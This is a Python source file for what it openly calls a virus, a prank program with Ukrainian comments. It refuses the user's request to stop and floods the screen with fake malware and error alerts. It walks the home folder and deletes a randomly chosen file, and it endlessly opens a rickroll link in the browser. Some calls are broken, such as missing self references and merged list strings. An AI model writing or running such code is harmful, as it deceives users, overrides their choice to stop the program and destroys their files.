# Імпорт бібліотек
import os
import sys
import time
import random
import threading
import webbrowser
import tkinter as tk
from tkinter import messagebox
# Імпорт власних файлів
from config import MIN_FOLDER_NUMBER, MAX_FOLDER_NUMBER, FILE_CREATION_CHANCE, MIN_RICKROLL_INTERVAL, MAX_RICKROLL_INTERVAL, RICKROLL_PAUSE, MIN_RICKROLL_CYCLE, MAX_RICKROLL_CYCLE

class GUI_Utils:
    # Конструктор за замовчуванням
    def __init__(self):
        self.windows_counter = 0
        self.rickroll_counter = 0
    
    def show_start_message(self):
        root = tk.Tk()
        root.title("Like Prompt")
        root.geometry("1x1")
        root.update_idletasks()
        
        # Відцентрувати кореневе вікно на екрані
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (root.winfo_width() // 2)
        y = (screen_height // 2) - (root.winfo_height() // 2)
        root.geometry(f"+{x}+{y}")

        user_name = os.environ.get("USERNAME")

        messagebox.showinfo("Info", f"Hi, {user_name}! Unfortunately, you have launched a virus on your PC. But don't worry, I'm here to remind you of the importance of security! In the meantime, I wish you a fun time cleaning up the mess I made.", parent=root)
        
        self.windows_counter += 1
        root.destroy()

    # Функція, що відображає підказку, яка запитує користувача, чи хоче він продовження роботи програми
    def show_stop_prompt(self):
        root = tk.Tk()
        root.title("Stop Prompt")
        root.geometry("1x1")
        root.update_idletasks()
        
        # Відцентрувати кореневе вікно на екрані
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (root.winfo_width() // 2)
        y = (screen_height // 2) - (root.winfo_height() // 2)
        root.geometry(f"+{x}+{y}")

        user_response = messagebox.askquestion("Stop Prompt", "Do you want me to stop?", parent=root)
        if user_response == "yes":
            messagebox.showinfo("Info", "But I don't, so I'll keep going.", parent=root)
        else:
            messagebox.showinfo("Info", "Okay, I'll continue.", parent=root)
        
        self.windows_counter += 1
        root.destroy()

    # Функція, що відображає підказку, яка запитує користувача, чи хоче він продовження роботи програми
    def show_like_prompt(self):
        root = tk.Tk()
        root.title("Like Prompt")
        root.geometry("1x1")
        root.update_idletasks()
        
        # Відцентрувати кореневе вікно на екрані
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (root.winfo_width() // 2)
        y = (screen_height // 2) - (root.winfo_height() // 2)
        root.geometry(f"+{x}+{y}")

        user_response = messagebox.askquestion("Like Prompt", "Do you like this program?", parent=root)
        if user_response == "yes":
            messagebox.showinfo("Info", "Good to hear, let's keep going!", parent=root)
        else:
            messagebox.showinfo("Info", "I'm sorry, but I will continue anyway.", parent=root)
        
        self.windows_counter += 1
        root.destroy()

    # Функція для випадкового вибору файлу з файлової системи
    def get_random_file_path(self):
        root_dir = os.path.expanduser("~") 
        files = []

        for dirpath, dirnames, filenames in os.walk(root_dir, topdown=True):
            # Видаляємо теки, які починаються з крапки, з обходу
            dirnames[:] = [d for d in dirnames if not d.startswith('.')]
            
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    # Перевіряємо, чи маємо доступ до файлу
                    if os.access(file_path, os.R_OK):
                        files.append(file_path)
                except PermissionError:
                    continue

        if files:
            show_delete_prompt(random.choice(files))
        else:
            return None

    # Функція, що відображає підказку, яка запитує користувача, чи хоче він видалити файл який був випадково обраний на ПК користувача
    def show_delete_prompt(self,file_path):
        root = tk.Tk()
        root.title("Delete Prompt")
        root.geometry("1x1")
        root.update_idletasks()

        # Відцентрувати кореневе вікно на екрані
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (root.winfo_width() // 2)
        y = (screen_height // 2) - (root.winfo_height() // 2)
        root.geometry(f"+{x}+{y}")

        def delete_file(file_path):
            if os.path.isfile(file_path):
                os.remove(file_path)
            else:
                messagebox.showerror("Oops", "Something strange has happened. The file was not found or is not a file.", parent=root)

        user_response = messagebox.askquestion("Delete Prompt", f"I found a file on your PC in this path:\n{file_path}\nShould I delete it?", parent=root)
        if user_response == "yes":
            messagebox.showinfo("Info", "Okay, then I will do it.", parent=root)
            delete_file(file_path)
        else:
            messagebox.showinfo("Info", "Hm, okay, then I won't...", parent=root)

        self.windows_counter += 1
        root.destroy()

    # Функція що відображає поламаний текст
    def show_broken_text(self):
        broken_title = [
            "G1lti¢hEd M3ss@ge",
            "Unr34d@ble C0dE",
            "M4lfunc+10n Ale®t",
            "D@t@ C0rrup+ion",
            "Err#r 404: T3xt N0t Found",
            "T3xt D3cod3 F@il"
        ]
        broken_text = [
            "L0@d!ng... D@t@ *err0r*.",
            "C@nn0t pr0c�ss th!s r3qu�st.",
            "Syst3m fail�ur�: R�try lat�r.",
            "�$%#@!&*()_+{}|:<>?",
            "@#%$#*&%*#?",
            "�~!@#�%&*()><"
            "                               "
        ]
        
        root = tk.Tk()
        root.title("Joke Time")
        root.geometry("1x1")
        root.update_idletasks()
        
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (root.winfo_width() // 2)
        y = (screen_height // 2) - (root.winfo_height() // 2)
        root.geometry(f"+{x}+{y}")

        messagebox.showinfo(random.choice(broken_title), random.choice(broken_text), parent=root)
        
        self.windows_counter += 1
        root.destroy()

    # Функція що відображає випадкові жарти
    def show_random_jokes(self):
        jokes = [
            "Why don't programmers like nature? It has too many bugs.",
            "Why was the computer cold? It left its Windows open.",
            "Why was the computer tired when it got home? It had a hard drive.",
            "I asked my antivirus if it could stop the spread of bad jokes... It said, \"Sorry, that's beyond my firewall!\"",
            "Why did the hacker take a break? To clear his cache!",
            "How does a computer get drunk? It takes screenshots.",
            "My password is 'incorrect'... So when I forget it, the computer tells me, 'Your password is incorrect.'"
        ]
        
        root = tk.Tk()
        root.title("Joke Time")
        root.geometry("1x1")
        root.update_idletasks()
        
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (root.winfo_width() // 2)
        y = (screen_height // 2) - (root.winfo_height() // 2)
        root.geometry(f"+{x}+{y}")

        messagebox.showinfo("Random Joke", random.choice(jokes), parent=root)
        
        self.windows_counter += 1
        root.destroy()

    # Функція що відображає випадкові цікаві факти
    def show_random_facts(self):
        facts = [
            "The first computer virus was created in 1983 and was named 'Elk Cloner'. It spread via floppy disks.",
            "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly edible.",
            "The term 'bug' to describe a software glitch comes from an actual moth found in a computer in 1947.",
            "Octopuses have three hearts, nine brains, and blue blood.",
            "Approximately 90% of all emails sent are spam, often containing malicious links or attachments.",
            "A day on Venus is longer than a year on Venus due to its slow rotation.",
            "The word 'hacker' originally referred to someone who was skilled at programming and solving technical problems.",
            "Wombat poop is cube-shaped, which prevents it from rolling away and helps mark their territory.",
            "In 2017, a massive ransomware attack known as 'WannaCry' affected over 200,000 computers in 150 countries in just one day.",
            "Bananas are berries, but strawberries aren't."
            "The first website ever created is still online. It's a basic page about the World Wide Web, created by Tim Berners-Lee in 1991."
        ]
        
        root = tk.Tk()
        root.title("Fun Fact")
        root.geometry("1x1")
        root.update_idletasks()
        
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (root.winfo_width() // 2)
        y = (screen_height // 2) - (root.winfo_height() // 2)
        root.geometry(f"+{x}+{y}")

        messagebox.showwarning("Did You Know?", random.choice(facts), parent=root)
        
        self.windows_counter += 1
        root.destroy()

    # Функція що відображає випадкові помилки
    def show_random_error(self):
        errors_title = [
            "Error"
            "Error 404",
        ]
        errors_text = [
            "The system encountered an unforeseen anomaly.",
            "Operation could not be completed due to an internal breakdown.",
            "Error 404: The sense of humor not found.",
            "Oops! Something went wrong. Please check your inputs and try again."
        ]
        
        root = tk.Tk()
        root.title("Error")
        root.geometry("1x1")
        root.update_idletasks()
        
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (root.winfo_width() // 2)
        y = (screen_height // 2) - (root.winfo_height() // 2)
        root.geometry(f"+{x}+{y}")

        messagebox.showerror(random.choice(errors_title), random.choice(errors_text), parent=root)
        
        self.windows_counter += 1
        root.destroy()

    # Функція, що відображає серію вікон що спливають з різними повідомленнями
    def display_infinite_popups(self):
        popup_title = [
            "Alert: Unexpected Behavior",
            "Warning: System Overload",
            "Error: Unauthorized Access",
            "Critical: Action Required",
            "Notice: Unusual Activity"
        ]

        popup_content = [
            "The system is acting strangely. Proceed with caution.",
            "Unexpected behavior detected. Do you wish to continue?",
            "Unauthorized access attempt detected. Review your security settings.",
            "A critical issue has occurred. Immediate action is required!",
            "Unusual activity noticed. It might affect your system performance."
        ]

        root = tk.Tk()
        root.title(random.choice(popup_title))
        root.geometry("1x1")
        root.update_idletasks()
        
        # Відцентрувати кореневе вікно на екрані
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (root.winfo_width() // 2)
        y = (screen_height // 2) - (root.winfo_height() // 2)
        root.geometry(f"+{x}+{y}")

        popup_count = random.randint(1, 10)
        for _ in range(popup_count):
            info_type = random.randint(0, 3)
            if info_type == 0:
                messagebox.showerror("Error", random.choice(popup_content), parent=root)
            elif info_type == 1:
                messagebox.showwarning("Warning", random.choice(popup_content), parent=root)
            else:
                messagebox.showinfo("Info", random.choice(popup_content), parent=root)
        
        self.windows_counter += 1
        root.destroy()

    # # Функція, що створює вікно з випадково змінюваним кольором фону
    def change_background_color(root, self):
        def update_color():
            colors = ['red', 'green', 'blue', 'yellow', 'pink', 'purple', 'orange', 'cyan', "magenta"]
            while True:
                root.after(0, root.config, {'bg': random.choice(colors)})
                root.after(random.randint(250, 500))

        # Запуск зміни кольору у фоновому потоці
        threading.Thread(target=update_color, daemon=True).start()

    def create_random_background_color_window(self):
        root = tk.Tk()
        root.title("Random Background Color")
        width = random.randint(250, 500)
        height = random.randint(250, 500)
        x = random.randint(0, root.winfo_screenwidth() - width)
        y = random.randint(0, root.winfo_screenheight() - height)
        root.geometry(f"{width}x{height}+{x}+{y}")
        
        # Запуск функції зміни кольору
        change_background_color(root)
        
        self.windows_counter += 1
        root.mainloop()

    # Функція, що створює вікно, яке випадковим чином переміщується по екрану
    def create_moving_window(self):
        def move_window():
            screen_width = root.winfo_screenwidth()
            screen_height = root.winfo_screenheight()
            
            x, y = random.randint(0, screen_width - width), random.randint(0, screen_height - height)
            root.geometry(f'{width}x{height}+{x}+{y}')
            root.after(random.randint(500, 1000), move_window)  # Переміщати кожні 1000-3000 мс
        
        root = tk.Tk()
        
        # Випадковий заголовок і текст для вікна
        moving_window_title = [
            "System Malfunction",
            "Unresponsive Error",
            "Security Alert",
            "Hidden Process Detected",
            "Intrusive Script"
        ]

        moving_window_content = [
            "Your system seems to be malfunctioning. Check for updates.",
            "The application is not responding. Consider force-closing it.",
            "Security alert: Potential threat detected.",
            "A hidden process has been detected. Ensure your system is secure.",
            "An intrusive script is running. It might affect your system's performance."
        ]

        root.title(random.choice(moving_window_title))
        
        # Випадкові розміри вікна при створенні
        width = random.randint(200, 500)
        height = random.randint(200, 500)
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        
        # Випадкова початкова позиція
        x, y = random.randint(0, screen_width - width), random.randint(0, screen_height - height)
        root.geometry(f'{width}x{height}+{x}+{y}')

        tk.Label(root, text=random.choice(moving_window_content)).pack(expand=True)

        # Запуск функції переміщення вікна
        move_window()
        
        self.windows_counter += 1
        root.mainloop()

    # Функція, що створює багато вікон, які випадковим чином розміщуються на екрані
    def create_random_windows(self):
        window_title = [
            "Malware Warning",
            "Critical Error",
            "System Alert",
            "Warning: Possible Corruption",
            "Error: Unexpected Shutdown"
        ]

        window_content = [
            "Malware activity detected. Run a full system scan immediately.",
            "A critical error has occurred. Your system might be unstable.",
            "System alert: Please review recent changes and actions.",
            "Possible system corruption detected. Backup your data now.",
            "Unexpected shutdown detected. Check for hardware or software issues."
        ]

        window_count = random.randint(10, 50)
        windows = []
        
        root = tk.Tk()
        root.withdraw()
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = random.randint(0, screen_width - 100)
        y = random.randint(0, screen_height - 100)

        for _ in range(window_count):
            window = tk.Tk()
            window.title(random.choice(window_title))
            width = random.randint(100, 300)
            height = random.randint(100, 300)
            window.geometry(f"{width}x{height}+{x}+{y}")
            tk.Label(window, text=random.choice(window_content)).pack(expand=True)
            windows.append(window)
            x += random.choice([-1, 1]) * random.randint(10, 50)
            y += random.choice([-1, 1]) * random.randint(10, 50)
            if random.random() < 0.1:
                x += random.choice([-1, 1]) * random.randint(10, 50)
            if random.random() < 0.1:
                y += random.choice([-1, 1]) * random.randint(10, 50)
        
        for window in windows:
            self.windows_counter += 1
            window.mainloop()
            time.sleep(0.5)
    
    def rickroll(self):
        url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        while True:
            RICKROLL_CYCLE_COUNT = random.randint(MIN_RICKROLL_CYCLE, MAX_RICKROLL_CYCLE)
            for _ in range(RICKROLL_CYCLE_COUNT):
                webbrowser.open(url)
                self.rickroll_counter += 1
                time.sleep(random.randint(MIN_RICKROLL_INTERVAL, MAX_RICKROLL_INTERVAL))
            print(f"Rickroll cycle completed. Pausing for {RICKROLL_PAUSE} seconds.")
            time.sleep(RICKROLL_PAUSE)